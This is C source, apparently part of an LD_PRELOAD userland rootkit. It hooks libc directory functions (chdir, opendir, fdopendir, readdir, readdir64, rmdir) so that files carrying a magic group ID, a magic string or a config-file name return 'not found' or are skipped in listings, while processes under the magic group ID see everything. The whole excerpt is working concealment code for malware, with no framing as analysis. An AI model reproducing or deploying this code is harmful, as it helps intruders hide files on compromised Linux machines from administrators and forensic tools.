int chdir(const char *path) {
  struct stat s_fstat;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_chdir) old_chdir = dlsym(libc, "chdir");
  if (!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(getgid()==MAGIC_GID) return old_chdir(path);
  memset (&s_fstat, 0, sizeof (stat));
  old_xstat (_STAT_VER, path, &s_fstat);
  if(strstr(path,MAGIC_STRING) || s_fstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return -1;
  }
 return old_chdir(path);
}

DIR *fdopendir (int fd) {
  struct stat s_fstat;

  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_fdopendir) old_fdopendir = dlsym(libc, "fdopendir");
  if(getgid() == MAGIC_GID) return old_fdopendir(fd);
  if (!old_fxstat) old_fxstat = dlsym(libc, "__fxstat");
  memset (&s_fstat, 0, sizeof (stat));
  old_fxstat (_STAT_VER, fd, &s_fstat);
  if (s_fstat.st_gid == MAGIC_GID) {
    errno = ENOENT;
    return NULL;
  }
  return old_fdopendir (fd);
}

DIR *opendir (const char *name) {
  struct stat s_fstat;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (old_opendir == NULL) old_opendir = dlsym(libc, "opendir");
  if (!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(getgid() == MAGIC_GID) return old_opendir(name);
  memset (&s_fstat, 0, sizeof (stat));
  old_xstat (_STAT_VER, name, &s_fstat);
  if (s_fstat.st_gid == MAGIC_GID || strstr (name, CONFIG_FILE)
      || strstr (name, MAGIC_STRING)) {
    errno = ENOENT;
    return NULL;
  }
  return old_opendir (name);
}


struct dirent *readdir(DIR *dirp) {
  struct dirent *dir;
  struct stat s_fstat;
  char path[4097]; // PATH_MAX on modern (and ancient) Linux is 4096
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_readdir) old_readdir = dlsym(libc, "readdir");
  if (!old_xstat) old_xstat = dlsym(libc, "__xstat");
  memset(&s_fstat, 0, sizeof(stat));

  do {
    dir = old_readdir(dirp);
    if (getgid() == MAGIC_GID) return dir;

    if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0))
      continue;

    if(dir != NULL) {

      snprintf(path,4096,"%s/%s", recover_dirname(dirp), dir->d_name);
      old_xstat(_STAT_VER, path, &s_fstat);
    }
  } while(dir && (strstr(dir->d_name, MAGIC_STRING) != 0 || strstr(dir->d_name, CONFIG_FILE) != 0 || s_fstat.st_gid == MAGIC_GID));

  return dir;
}

struct dirent64 *readdir64(DIR *dirp) {
  struct dirent64 *dir;
  struct stat s_fstat;
  char path[4097];
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_readdir64) old_readdir64 = dlsym(libc, "readdir64");
  if (!old_xstat) old_xstat = dlsym(libc, "__xstat");
  memset(&s_fstat, 0, sizeof(stat));

  do {
    dir = old_readdir64(dirp);
    if (getgid() == MAGIC_GID) return dir;

    if (dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0))
      continue;
    if(dir != NULL) {
      snprintf(path, 4096, "%s/%s",  recover_dirname(dirp), dir->d_name);
      old_xstat(_STAT_VER, path, &s_fstat);
    }
  } while(dir && (strstr(dir->d_name, MAGIC_STRING) != 0 || strstr(dir->d_name, CONFIG_FILE) != 0 || s_fstat.st_gid == MAGIC_GID));
  return dir;
}

int rmdir (const char *pathname) {
  struct stat s_fstat;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_rmdir) old_rmdir = dlsym(libc, "rmdir");
  if (!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(getgid() == MAGIC_GID) return old_rmdir(pathname);
  memset (&s_fstat, 0, sizeof (stat));
  old_xstat (_STAT_VER, pathname, &s_fstat);
  if (s_fstat.st_gid == MAGIC_GID || strstr (pathname, MAGIC_STRING) || strstr (pathname, CONFIG_FILE)) {
    errno = ENOENT;
    return -1;
  }
  return old_rmdir (pathname);
}
